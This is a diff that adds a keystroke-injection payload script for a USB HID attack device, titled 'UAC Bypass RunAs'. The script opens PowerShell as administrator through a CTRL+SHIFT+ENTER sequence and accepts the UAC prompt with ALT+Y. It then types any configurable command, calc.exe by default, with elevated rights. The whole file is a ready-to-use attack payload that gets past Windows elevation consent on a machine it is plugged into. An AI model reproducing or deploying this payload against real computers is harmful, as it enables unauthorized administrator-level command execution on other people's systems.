@@ -1,0 +1,27 @@
+NAME UAC Bypass RunAs
+DESCRIPTION Bypasses UAC via RunAs with HOLD/RELEASE key technique
+CATEGORY exploit
+PLATFORMS WIN
+OPTION COMMAND calc.exe "Command to execute as admin"
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+LED_COLOR YELLOW
+GUI r
+DELAY 800
+STRING powershell
+REM Hold CTRL+SHIFT and press ENTER for 'Run as Administrator'
+HOLD CTRL
+HOLD SHIFT
+ENTER
+RELEASE SHIFT
+RELEASE CTRL
+DELAY 2000
+REM Accept UAC prompt with ALT+Y
+ALT y
+DELAY 1500
+LED_COLOR GREEN
+STRINGLN {{COMMAND}}
+DELAY 500
+STRING exit
+ENTER
